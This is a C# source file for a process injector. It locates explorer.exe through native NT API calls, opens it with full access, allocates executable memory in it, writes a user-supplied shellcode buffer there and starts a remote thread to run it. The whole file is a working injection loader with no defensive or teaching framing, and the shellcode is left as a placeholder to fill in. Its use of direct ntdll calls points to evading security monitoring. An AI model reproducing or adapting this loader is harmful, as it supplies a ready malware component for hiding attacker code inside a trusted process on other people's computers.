using System;
using System.Runtime.InteropServices;

public class ProcessInjector : IDisposable
{
    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint THREAD_ALL_ACCESS = 0x1FFFFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

    public enum SYSTEM_INFORMATION_CLASS
    {
        SystemProcessInformation = 5
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_PROCESS_INFORMATION
    {
        public uint NextEntryOffset;
        public uint NumberOfThreads;
        private long Reserved1;
        private long Reserved2;
        private long Reserved3;
        public long CreateTime;
        public IntPtr UserTime;
        public IntPtr KernelTime;
        public UNICODE_STRING ImageName;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        IntPtr SystemInformation,
        uint SystemInformationLength,
        ref uint ReturnLength
    );

    [DllImport("ntdll.dll")]
    private static extern int NtOpenProcess(
        out IntPtr ProcessHandle,
        uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId
    );

    [DllImport("ntdll.dll")]
    private static extern int NtClose(IntPtr Handle);

    [DllImport("ntdll.dll")]
    private static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out IntPtr NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    private static extern int NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect);

    private bool disposed = false;
    public IntPtr ProcessHandle { get; private set; } = IntPtr.Zero;

    public ProcessInjector(int pid)
    {
        var objAttr = new OBJECT_ATTRIBUTES
        {
            Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
            RootDirectory = IntPtr.Zero,
            ObjectName = IntPtr.Zero,
            Attributes = 0,
            SecurityDescriptor = IntPtr.Zero,
            SecurityQualityOfService = IntPtr.Zero
        };

        var clientId = new CLIENT_ID
        {
            UniqueProcess = (IntPtr)pid,
            UniqueThread = IntPtr.Zero
        };

        int status = NtOpenProcess(out IntPtr hProcess, PROCESS_ALL_ACCESS, ref objAttr, ref clientId);
        if (status != 0 || hProcess == IntPtr.Zero)
            throw new Exception($"NtOpenProcess failed (PID: {pid}, Status: 0x{status:X8})");

        ProcessHandle = hProcess;
    }

    public static int GetPidByName(string targetProcess)
    {
        int bufferSize = 0x10000;
        IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
        uint retLen = 0;
        const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        try
        {
            uint status;
            do
            {
                status = NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemProcessInformation, buffer, (uint)bufferSize, ref retLen);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    Marshal.FreeHGlobal(buffer);
                    bufferSize *= 2;
                    buffer = Marshal.AllocHGlobal(bufferSize);
                }
            } while (status == STATUS_INFO_LENGTH_MISMATCH);

            if (status != 0)
                throw new Exception($"NtQuerySystemInformation failed with status 0x{status:X}");

            int offset = 0;
            while (true)
            {
                IntPtr entryPtr = IntPtr.Add(buffer, offset);
                SYSTEM_PROCESS_INFORMATION spi = Marshal.PtrToStructure<SYSTEM_PROCESS_INFORMATION>(entryPtr);

                string name = spi.ImageName.Buffer != IntPtr.Zero
                    ? Marshal.PtrToStringUni(spi.ImageName.Buffer, spi.ImageName.Length / 2)
                    : "";

                if (string.Equals(name, targetProcess, StringComparison.OrdinalIgnoreCase))
                {
                    return spi.UniqueProcessId.ToInt32();
                }

                if (spi.NextEntryOffset == 0)
                    break;

                offset += (int)spi.NextEntryOffset;
            }

            throw new Exception($"Process '{targetProcess}' not found.");
        }
        finally
        {
            Marshal.FreeHGlobal(buffer);
        }
    }

    public IntPtr AllocateMemory(int size)
    {
        IntPtr addr = VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero)
            throw new Exception("VirtualAllocEx failed.");
        return addr;
    }

    public void WriteMemory(IntPtr baseAddress, byte[] buffer)
    {
        int status = NtWriteVirtualMemory(ProcessHandle, baseAddress, buffer, (uint)buffer.Length, out IntPtr bytesWritten);
        if (status != 0)
            throw new Exception($"NtWriteVirtualMemory failed: 0x{status:X}");
        if (bytesWritten.ToInt64() != buffer.Length)
            throw new Exception($"Incomplete write: wrote {bytesWritten} bytes out of {buffer.Length}");
    }

    public IntPtr CreateThread(IntPtr startAddress, IntPtr parameter)
    {
        int status = NtCreateThreadEx(out IntPtr threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, ProcessHandle,
                                      startAddress, parameter, false, 0, 0, 0, IntPtr.Zero);

        if (status != 0)
            throw new Exception($"NtCreateThreadEx failed: 0x{status:X}");

        return threadHandle;
    }

    public void Dispose()
    {
        if (!disposed)
        {
            if (ProcessHandle != IntPtr.Zero)
            {
                NtClose(ProcessHandle);
                ProcessHandle = IntPtr.Zero;
            }
            disposed = true;
            GC.SuppressFinalize(this);
        }
    }

    ~ProcessInjector()
    {
        Dispose();
    }
}

class Program
{
    static void Main()
    {
        string processName = "explorer.exe";
        int pid = ProcessInjector.GetPidByName(processName);
        using (var injector = new ProcessInjector(pid))
        {
            byte[] shellcode = new byte[] { /* your shellcode bytes here */ };

            IntPtr remoteAddr = injector.AllocateMemory(shellcode.Length);
            injector.WriteMemory(remoteAddr, shellcode);
            IntPtr threadHandle = injector.CreateThread(remoteAddr, IntPtr.Zero);

            Console.WriteLine($"Injected into PID {pid}, thread handle: {threadHandle}");
            // Remember to close threadHandle if needed with CloseHandle(threadHandle) from kernel32.dll
        }
    }
}
